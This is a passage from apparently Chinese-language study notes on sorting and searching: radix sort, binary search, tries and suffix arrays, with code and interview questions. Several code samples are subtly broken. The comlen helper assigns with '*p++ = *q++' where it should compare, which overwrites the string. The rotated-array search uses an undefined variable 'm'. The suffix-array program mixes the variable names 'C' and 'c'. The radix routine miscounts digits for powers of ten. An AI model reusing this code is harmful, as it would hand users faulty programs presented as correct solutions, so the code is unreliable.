class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于桶中将要存放多少元素是不确定的，因此最好将桶定义为链表数据结构。</p><ul><li><strong>复杂度</strong></li></ul><p>桶排序的时间复杂度取决与对各个桶之间数据进行排序的时间复杂度，因为其它部分的时间复杂度都为O(n)。很显然,桶划分的越小，各个桶之间的数据越少，排序所用的时间也会越少，但相应的空间消耗就会增大。</p><h3 id="5-5-基数排序（重要）"><a href="#5-5-基数排序（重要）" class="headerlink" title="5.5 基数排序（重要）"></a>5.5 基数排序（重要）</h3><p>基数排序是桶排序的扩展，是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。</p><p><strong>算法描述</strong>：</p><ul><li>取得数组中的最大数，并取得位数；</li><li>arr为原始数组，从最低位开始取每个位组成radix数组；</li><li>对radix进行计数排序（利用计数排序适用于小范围数的特点）；</li></ul><ol><li>按个位数分配桶：</li></ol><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220719211404111.png" alt="image-20220719211404111" style="zoom: 67%;"><ol start="2"><li>然后依次从桶中收集元素，同一桶中的元素，<strong>先进桶的在前</strong>，此序列的<strong>个位数是有序的</strong>：</li></ol><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220719211636628.png" alt="image-20220719211636628" style="zoom: 67%;"><ol start="3"><li>接着，按照第一次收集的序列顺序，再依次入桶，这次按十位数分配桶：</li></ol><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220719211805074.png" alt="image-20220719211805074" style="zoom:67%;"><ol start="4"><li>然后依次从桶中收集元素，同一桶中的元素，先进桶的在前，此序列的<strong>十位个位组成的数是有序的</strong>：</li></ol><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220719211923655.png" alt="image-20220719211923655" style="zoom:67%;"><ol start="5"><li>接着，按照第二次收集的序列顺序，再依次入桶，这次按百位数分配桶：</li></ol><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220719212141666.png" alt="image-20220719212141666" style="zoom:67%;"><ol start="6"><li>然后依次从桶中收集元素，同一桶中的元素，先进桶的在前，此序列的<strong>个十百位组成的数都是有序的</strong>：</li></ol><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220719212223426.png" alt="image-20220719212223426" style="zoom:67%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">radix</span>(<span class="params">arr</span>):</span><br><span class="line">    </span><br><span class="line">    digit = <span class="number">0</span></span><br><span class="line">    max_digit = <span class="number">1</span></span><br><span class="line">    max_value = <span class="built_in">max</span>(arr)</span><br><span class="line">    <span class="comment">#找出列表中最大的位数</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">10</span>**max_digit &lt; max_value:</span><br><span class="line">        max_digit = max_digit + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> digit &lt; max_digit:</span><br><span class="line">        temp = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">            <span class="comment">#求出每一个元素的个、十、百位的值</span></span><br><span class="line">            t = <span class="built_in">int</span>((i/<span class="number">10</span>**digit)%<span class="number">10</span>)</span><br><span class="line">            temp[t].append(i)</span><br><span class="line">        </span><br><span class="line">        coll = []</span><br><span class="line">        <span class="keyword">for</span> bucket <span class="keyword">in</span> temp:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> bucket:</span><br><span class="line">                coll.append(i)</span><br><span class="line">                </span><br><span class="line">        arr = coll</span><br><span class="line">        digit = digit + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><ul><li><strong>稳定性</strong>：稳定。</li></ul><h3 id="5-6-不同排序算法的比较"><a href="#5-6-不同排序算法的比较" class="headerlink" title="5.6 不同排序算法的比较"></a>5.6 不同排序算法的比较</h3><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220719201134170.png" alt="image-20220719201134170"></p><ul><li><p><strong>稳定性</strong></p><p><u>所有简单排序</u>(时间复杂度为0(n)都是**<u>稳定排序</u><strong>，</strong>选择排序除外**；</p><p><u>所有时间复杂度为$O(nlog_2n)$的排序</u>都是<u><strong>不稳定排序</strong></u>，<strong>归并排序、基数排序除外</strong>。希尔排序是不稳定排序，基数排序是稳定排序。</p></li><li><p><strong>时间复杂度</strong>（比较次数）</p><p><u>比较次数<strong>与初始排列无关</strong>的是<strong>选择排序</strong></u>（简单选择排序、堆排序）。</p><p>在初始序列<u><strong>基本有序</strong> 的情况下</u>，<u><strong>最优的是插入排序</strong> </u>，此时插入排序时间复杂度为O(n)，其次是冒泡排序，时间复杂度也为O(n)， <strong>快速排序在此时性能最差</strong>，时间复杂度为$O(n^2)$。同时，快速排序在初始序列逆序的时候，性能也最差，此时时间复杂度也为$O(n^2)$。</p><p><u><strong>堆排序对初始数据集的排列顺序不敏感</strong></u>，在最好、最坏和平均情况下，堆排序的时间复杂度均为$O(nlog_2n)$。</p></li><li><p><strong>空间复杂度</strong></p><p>基于比较的排序算法中（插入排序、交换排序、选择排序、归并排序），归并排序的空间复杂度最高，为$O(n)$，其次为快速排序，为$O(logn)$，其余的为$O(1)$。</p></li></ul><h2 id="6-查找"><a href="#6-查找" class="headerlink" title="6 查找"></a>6 查找</h2><h3 id="6-1-基本概念"><a href="#6-1-基本概念" class="headerlink" title="6.1 基本概念"></a>6.1 基本概念</h3><p>查找结构（查找表）：用于查找的数据集合称为查找结构（查找表），它可以是一个链表，也可以是一个数组或其他数据类型。对于查找表经常进行的操作一般有四种：</p><ol><li><strong>查询</strong> 某个特定的数据元素是否在查找表中；</li><li><strong>检索</strong> 满足条件的某个特定的数据元素的各种<strong>属性</strong>；</li><li>在查找表中 <strong>插入</strong> 一个数据元素；</li><li>从查找表中 <strong>删除</strong> 某个数据元素。</li></ol><p>如果一个查找表的操作只涉及1和2的操作，则无须动态地修改查找表，此类查找表称为静态查找表。与此对应，需要动态地修改的查找表则称为动态查找表。</p><p>适合静态查找表的查找方法有：顺序查找、折半查找、散列查找等；适合动态查找表的查找方法有二叉排序树的查找、散列查找等。</p><p>平均查找长度：在查找的过程中，一次查找的长度是指需要比较的关键码次数，而平均查找长度则是所有查找过程中进行的关键码比较次数的平均值，其定义如下：<br>$$<br>ASL&#x3D;\sum_{i&#x3D;1}^np_ic_i<br>$$<br>式中，$p_i$为查找第i个元素的概率，一般认为每个元素的查找概率相等；$c_i$为找到第i个元素所需的比较次数。平均查找次数ASL是衡量查找算法效率的最主要指标。</p><blockquote><p>例1：查找一个整数数组中第二大的数。（2012，迅雷）</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> minNum = <span class="number">-32767</span>;     <span class="comment">// int型最小值</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find_sec_max</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> count)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> maxnumber=data[<span class="number">0</span>];</span><br><span class="line"><span class="type">int</span> sec_max = minNum;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(data[i] &gt; maxnumber) &#123;</span><br><span class="line">            sec_max = maxnumber;   <span class="comment">// 原来的最大值变成第二大</span></span><br><span class="line">            maxnumber = data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[i] &gt; sec_max)</span><br><span class="line">                sec_max = data[i];  <span class="comment">// 原来的第二大值被换下</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> sec_max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-2-折半查找"><a href="#6-2-折半查找" class="headerlink" title="6.2 折半查找"></a>6.2 折半查找</h3><p>折半查找又称为 <strong>二分查找</strong>，<u>仅适用于事先已经排好序的顺序表</u>。</p><p><strong>基本思路</strong></p><p>首先将给定值K与表中中间位置元素的关键字比较，若相等，则查找成功，返回该元素的存储位置；若不等，则所需查找的元素只能在中间数据以外的前半部分或后半部分中。然后在缩小的范围中继续进行同样的查找，如此重复直到找到为止。算法如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">BinSearch</span> <span class="params">(RecType R[], <span class="type">int</span> n, KeyType k)</span> </span>&#123;</span><br><span class="line"><span class="comment">//在有序表R中查找关键字为key的元素，若存在则返回其位置，不存在则返回-1</span></span><br><span class="line">    <span class="type">int</span> low=<span class="number">0</span>, high=n<span class="number">-1</span>, mid;</span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high) &#123;     <span class="comment">// 有序表存在元素时循环</span></span><br><span class="line">    mid= (low+high)/<span class="number">2</span>;</span><br><span class="line">    <span class="comment">//取中间位置</span></span><br><span class="line">    <span class="keyword">if</span> (R[mid].key == k)  <span class="comment">// 查找成功，返回其逻辑序号mid+1</span></span><br><span class="line">    <span class="keyword">return</span> mid+<span class="number">1</span>;</span><br><span class="line">   <span class="keyword">if</span> (R[mid].key &gt; k)   <span class="comment">// 在前半部分继续查找</span></span><br><span class="line">    high = mid<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">            low = mid+<span class="number">1</span> ;       <span class="comment">// 在后半部分继续查找</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为折半查找需要方便地定位查找区域，所以适合折半查找的存储结构必须具有随机存取的特性。因此，<u>二分查找法仅适合于线性表</u>的顺序存储结构，不适合链式存储结构，<u>且要求元素按关键字有序排列</u>。</p><blockquote><p>例1：有一个循环有序数组A，如{7, 8, 9, 0, 1, 2, 3, 4, 5, 6}，不知道其最小值的位置。那么如何从这样的数组中寻找一个特定的元素呢? （2012，百度，2012，人民搜索）</p></blockquote><p>解答：可以将这个循环有序数组看作两个有序子数组，前一个子数组的元素均大于后一个数组。在二分查找的过程中，增加一个判断，确定中间元素位于哪一个子数组。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">lower为数组首元素下标</span></span><br><span class="line"><span class="comment">high为数组最后的元素下标，但由于是循环有序，所以R[high]并不是最大值</span></span><br><span class="line"><span class="comment">k为要查找的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">search</span><span class="params">(<span class="type">int</span> R[], <span class="type">int</span> lower, <span class="type">int</span> high, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line"><span class="keyword">while</span> (lower &lt;= high) &#123;</span><br><span class="line">        <span class="type">int</span> mid = (lower+high)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (R[mid] == k)    <span class="comment">// 查找成功，返回其逻辑序号mid+1</span></span><br><span class="line">            <span class="keyword">return</span> mid+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">// lower到mid是有序的，mid到high跨了两个子数组</span></span><br><span class="line">            <span class="keyword">if</span> (R[lower] &lt;= R[mid])&#123;   </span><br><span class="line">            <span class="keyword">if</span>(k &gt; R[mid])         <span class="comment">// k大于mid</span></span><br><span class="line">                    lower = m+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (k &gt;= R[lower]) high = mid<span class="number">-1</span>;  <span class="comment">// k在lower和mid之间</span></span><br><span class="line">            <span class="keyword">else</span> lower = mid+<span class="number">1</span>;    <span class="comment">// k 比 lower 和 mid 均要小，所查找元素在mid之后</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// lower到mid跨了两个子数组，mid到high是有序的</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (k &lt; R[mid]) high = mid<span class="number">-1</span>;      <span class="comment">// k在lower和mid之间</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (k &lt;= R[high]) lower = mid+<span class="number">1</span>;   <span class="comment">// k在mid+1和high之间</span></span><br><span class="line">            <span class="keyword">else</span> high = mid<span class="number">-1</span>; <span class="comment">// k 比 mid 和 high 均要大，所查找元素在mid之前</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述算法对数组元素重复的时候不支持，比如{2, 2, 3, 2, 2}，此时只能依次遍历。</p><p><strong>判定树</strong></p><p>折半查找的过程可用图16-1所示的二叉树来描述，称为 <strong>判定树</strong>。树中每个圆形结点表示一个记录，结点中的值为该记录的关键字值；树中最下面的叶结点都是方形的，它表示查找不成功的情况。从判定树可以看出，查找成功时的查找长度为从根结点到目的结点的路径上的结点数，而查找不成功时的查找长度为从根结点到对应失败结点的父结点路径上的结点数；每个结点值（mid）均大于其左子结点值（low），且均小于其右子结点值（high）。若有序序列有n个元素，则对应的判定树有n个圆形的非叶结点和n+1个方形的叶结点。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220721110749501.png" alt="image-20220721110749501"></p><p>图16-1中，n个圆形结点（代表有序序列有n个元素）构成的树的深度与n个结点的<u>完全二叉树</u>的深度(高度)相等，均为$\lfloor log_2N \rfloor +1$ 或者 $\lceil log_2(N+1) \rceil \space$。</p><p><strong>折半查找的时间复杂度为$O(log_2N)$ ，最坏的情况下查找次数也不会超过为$\lfloor log_2N \rfloor +1$ ，不管有没有查找成功。</strong>比顺序查找的效率高。</p><p>在图16-1所示的判定树中，在等概率的情况下，查找成功的ASL&#x3D;(1x1+2x2+3x4+4x4)&#x2F;11&#x3D;3（每个结点的深度为其查找长度，深度为1的结点有1个，深度为2的结点有2个，深度为3的结点有4个，深度为4的结点有4个），查找不成功的ASL&#x3D;(3x4+4x8)&#x2F;12&#x3D;11&#x2F;3。</p><p>由上述的分析可知，用折半查找法查找到给定值或查找失败的比较次数最多不会超过树的高度，如在图16-1中，查找成功与查找不成功，最坏的情况下，都需要比较4次（$\lfloor log_2N \rfloor +1$ ，即树高）。</p><blockquote><p>例5：有一类数组，例如{1,2, 3, 4, 6, 8, 9, 4, 8, 11, 18, 19, 100}，前半部分是一个递增数组，后半部分还是递增数组，但整个数组不是递增数组，怎么最快地找出其中一个数(有大量查询待进行) ?(2011●百度)</p></blockquote><p>解答：开始时找出两个数组的分界线，有两个，一个是前一个数组的最末元素，另一个是后一个数组的最初元素，分别设为preMax和aftMin。</p><p>然后处理每个查询，查询过程为:</p><ol><li>分析要查找的数，若此数刚好等于preMax或aftMin，则返回相应位置;</li><li>否则，若此数小于preMax，则在前一个数组二分查找；</li><li>若此数大于aftMin，则也在后一个数组二分查找；</li><li>若此数大于preMax且小于aftMin，则不存在。</li></ol><h3 id="6-3-键树"><a href="#6-3-键树" class="headerlink" title="6.3 键树"></a>6.3 键树</h3><h4 id="键树的定义与Trie树"><a href="#键树的定义与Trie树" class="headerlink" title="键树的定义与Trie树"></a>键树的定义与Trie树</h4><p>键树又称为数字查找树（Digital Search Trees）。</p><p>键树其结构受启发于一部大型字典的“书边标目”。字典中标出首字母是A, B, C, …, Z的单词所在页，再对各部分标出第二字母为A, B, C, …, Z的单词所在的页等。</p><p>它是一棵度大于等于2的树，树中的<u>每个结点</u>中不是包含一个或几个关键字， 而是<u>只含有组成关键字的符号</u>。例如，若关键字是数值，则结点中只包含一个数位：若关键字是单词，则结点中只包含一个字母字符。</p><p>假设有如下16个关键字的集合：{CAI、CAO、LI、LAN、CHA、CHANG、WEN、CHAO、YUN、YANG、LONG、WANG、ZHAO、LIU、WU、CHEN}。可对此集合作如下的逐层分割，首先按首字母分成不同子集，然后再在子集中按第二个字符进行分割….直到每个小子集中只包含一个关键字为止。如图16-2所示。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220721153302732.png" alt="image-20220721153302732"></p><p><u>从根到叶子结点路径中结点的字符组成的字符串表示一个关键字</u>， <u>叶子结点中的特殊符号S表示字符串的结束</u>。</p><p>键树的存储通常有两种方式：</p><ul><li><p><strong>用树的孩子兄弟链表来表示键树（称为双链树）</strong></p><p>每个Node有三个域：</p><p>symbol域：存储关键字的一个字符；</p><p>son域：存储指向第一棵子树的根的指针；</p><p>brother域：存储指向右兄弟的指针。</p><p>这时的键树又称为双链树。图16-2所示键树的双链树如图16-3所示。</p><p>查找过程是，从根结点出发，顺着son查找，如果相等，继续下一个son。否则沿着brother查找。直到到了空指针为止。此时若仍未完成key的匹配，查找不成功。</p><p>在双链树中插入或删除一个关键字，相当于在树中某个结点上插入或删除一棵子树。</p></li><li><p><strong>用多重链表表示（又称为Trie树，字典树）</strong></p><p>如果以树的多重链表表示键树，则树的每个结点中应包含d个（d 为关键字符的基，如：字符集由英文大写字母构成时，则d&#x3D;26）指针域，此时的键树又称为Trie树。</p><p>Trie树的思想是<u>利用字符串的公共前缀来降低时空开销</u>。</p><p>由hello、her、hi、how、see、so组成的Trie树如下：</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220721160707317.png" alt="image-20220721160707317" style="zoom:67%;"><p>Trie树的典型应用是用于统计和排序大量的字符串（但不仅限于字符串），<strong>比较适合的是查找前缀匹配的字符串</strong>，所以<u>经常被搜索引擎系统用于文本词频统计</u>。</p><p>Trie树的优点是最大限度地减少无谓的字符串比较。</p><p>Trie树的缺点是如果存在大量字符串且这些字符串基本没有公共前缀，则相应的Trie树将非常消耗内存。</p><p>**构建Trie树时间复杂度是 O(n)*<em>（n是Trie树中所有元素的个数，即单词的个数</em>单词的平均长度）</p><p>**查询Trie树时间复杂度是 O(k)**（k 表示要查找的字符串的长度，即单词的平均长度）</p></li></ul><blockquote><p>例1：已知n个由小写字母构成的平均长度为10的单词，判断其中是否存在某个串为另一个串的前缀子串。</p></blockquote><p>解答：使用Trie树。假设要查询的单词是abc，显然以b, c, d…等不是以a开头的字符串就不用查找了。首先建立一棵Trie树，然后将每个单词插入Trie树，时间复杂度为O(n*len)，其中len为单词的平均长度10，然后依次查询每个单词，每个单词查询的时间复杂度为单词的长度。查询时看是否存在有单词与已有单词结点重合即可。</p><blockquote><p>例2：给定一个单词 a，如果通过交换单词中字母的顺序可以得到另外的单词b，那么定义b是a的兄弟单词，例如单词army和mary互为兄弟单词。现在给定一个字典，用户输入一个单词，如何根据字典找出这个单词有哪些兄弟单词?要求时间和空间效率尽可能高。(2012. 百度)</p></blockquote><p>解法一：使用hash_map和链表。</p><p>首先使兄弟单词具有相同的id，比如army和mary具有相同的id为amry（相当于对单词的字母进行排序）。然后使用hash_map，生成id到链表的映射，链表用来存储id所对应所有兄弟单词。开始时，先遍历字典，将每个单词按照其id加入hash_map对应的链表中去。当需要查找某一单词的兄弟单词时，只需计算其id，然后根据hash_map找到id所对应的链表，这样就可以确定其兄弟单词。其中，创建hash_map的时间复杂度为$O(n)$，查找兄弟单词的时间复杂度为$O(1)$。</p><p>解法二：也是使用hash_map和链表。（此方法无需对单词的字母进行排序来生成id）</p><p>将每个字母对应一个 <strong>质数</strong>，这样单词就可以对应为其字母的质数之积。将得到的值进行hash，这样兄弟单词就具有相同的hash值。将hash值与其对应的所有兄弟单词组成的链表进行hash_map映射，key单词的乘积，value为链表起始地址。当需要查找某一单词的兄弟单词时，只需计算其单词乘积，然后查找hash_map，遍历链表就能得到所有兄弟单词。其中，创建hash_map的时间复杂度为$O(n)$，查找兄弟单词的时间复杂度为$O(1)$。</p><p>解法三：利用Trie树。</p><p>单词插入Trie树之前，先按照字母排序，如army与mary排完序都是amry。然后将amry插入Trie树，在Trie树的结点中增加一个vector，记录所有的兄弟单词。这样查询的时候，只需先将查询词排序，然后把排序后的单词拿去查询，当所有字母都遍历后，读出对应结点的vector，里面存储的即是此单词的所有兄弟单词。</p><h4 id="键树的两种实现的对比"><a href="#键树的两种实现的对比" class="headerlink" title="键树的两种实现的对比"></a>键树的两种实现的对比</h4><p>双链树和Trie树是键树的两种不同表示方法，它们有各自的特点。</p><p>从其不同的存储结构特性可见，若键树中<strong>结点的度较大，则采用Trie树结构较双链树更为合适</strong>。</p><p>综上，键树的查找过程都是从根结点出发，走了一条从根到叶子( 或非终端结点)的路径，其<strong>查找时间依赖于单词的长度。</strong></p><h3 id="6-4-后缀树与后缀数组"><a href="#6-4-后缀树与后缀数组" class="headerlink" title="6.4 后缀树与后缀数组"></a>6.4 后缀树与后缀数组</h3><h4 id="后缀树"><a href="#后缀树" class="headerlink" title="后缀树"></a>后缀树</h4><p>键树只适合前缀匹配和全字匹配，而后缀树（Sufix Tree）适合后缀和子串匹配。它与键树的最大不同在于，后缀树的单词集合是由指定字符串的后缀子串构成的。</p><p>比如字符串“minimize” 的后缀子串分别如下：minimize, inimize, nimize, imize, mize, ize, ze， e<br>然后对这些子串的集合建立一棵键树， 即为“minimize”的后缀树。若字符串s为BIBS，则其建<br>立的后缀树如图16-4所示。含有所有的后缀子串BIBS、IBS、BS、S。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220721163309954.png" alt="image-20220721163309954"></p><p>后缀树常用于在串s中查询子串P是否存在。</p><p>**查询效率为O(n)**，n为单词长度。</p><p>后缀树还可以用来找出字符串S的最长重复子串S1、找出字符串S1和S2的最长公共子串、找出字符串s的最长回文子串S1等。</p><h4 id="后缀数组"><a href="#后缀数组" class="headerlink" title="后缀数组"></a>后缀数组</h4><p>后缀树实现较为复杂，通常可以用其变形后缀数组代替，使用数组来存储所有的后缀子串。</p><p>比如，若输入字符串为”banana”，该数组将表示这些后缀:</p><p>a[0]：bananaa[1]：ananaa[2]：nanaa[3]：anaa[4]：naa[5]：a</p><p>可见，由于数组a中的指针分别指向字符串中的每个后缀，所以将数组a命名为”后缀数组”。</p><blockquote><p>找出字符串S的最长重复子串S1，比如abcdabcd的最长重复子串是abcd，abcdabcda的最长重复子串是abcda，最长重复子串可以重叠。</p></blockquote><p>解法一：直接遍历。时间复杂度为$O(n^3)$。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">comlen</span><span class="params">(<span class="type">char</span> *p, <span class="type">char</span> *q)</span> </span>&#123;   <span class="comment">// 返回p、q数组的最大公共长度</span></span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(*p &amp;&amp; (*p++ = *q++)) ++i;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 逐个遍历所有的子串</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;n;++i) &#123;</span><br><span class="line"><span class="keyword">for</span>(j=i+<span class="number">1</span> ;j&lt;n;++j)&#123;</span><br><span class="line"><span class="keyword">if</span> ((thislen = <span class="built_in">comlen</span>(&amp;c[i]，&amp;c[j])) &gt; maxlen) &#123;</span><br><span class="line">maxlen = thislen;</span><br><span class="line">maxi = i; </span><br><span class="line">maxj = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解法二：使用后缀数组</p><p>生成后缀数组，然后对后缀数组进行快速排序，将后缀相近的子串集中在一一起。比如输入字符串为”banana”，则排序后的后缀数组如下:</p><p>a[0]：aa[1]：anaa[2]：ananaa[3]：bananaa[4]：naa[5]：nana</p><p>然后通过比较邻接元素，找出最长的重复字符串。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXCHAR 5000 <span class="comment">//最长处理5000个字符</span></span></span><br><span class="line"><span class="type">char</span> C[MAXCHAR], *a [MAXCHAR];     <span class="comment">// c存储字符串，a为指针数组，存储c的所有后缀子串</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">comlen</span><span class="params">(<span class="type">char</span> *p, <span class="type">char</span> *q)</span> </span>&#123;   <span class="comment">// 返回起始地址为p、q的数组的最大公共长度</span></span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(*p &amp;&amp; (*p++ = *q++)) ++i;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pstrcmp</span> <span class="params">(<span class="type">const</span> <span class="type">void</span> *p1, <span class="type">const</span> <span class="type">void</span> *p2)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strcmp</span> (*(<span class="type">char</span>**)p1, *(<span class="type">char</span>**)p2);  <span class="comment">// 应用于库函数快排qsort的比较函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> n=<span class="number">0</span>, i, temp, maxlen=<span class="number">0</span>, maxi=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;Please input your string:\n&quot;</span>);</span><br><span class="line">    n=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( (ch=<span class="built_in">getchar</span>())!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">    a[n] = &amp;c[n];</span><br><span class="line">    C[n++]=ch;</span><br><span class="line">    &#125;</span><br><span class="line">    c[n]=<span class="string">&#x27;\0&#x27;</span>;    <span class="comment">//将数组c中的最后一个元素设为空字符，以终止所有字符串</span></span><br><span class="line">    <span class="built_in">qsort</span>(a, n, <span class="built_in">sizeof</span>(<span class="type">char</span>*), pstrcmp);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt; n<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">    temp = <span class="built_in">comlen</span>(a[i], a[i+<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span> (temp &gt; maxlen) &#123;</span><br><span class="line">            maxlen = temp;</span><br><span class="line">            maxi = i;</span><br><span class="line">        &#125;</span><br><span 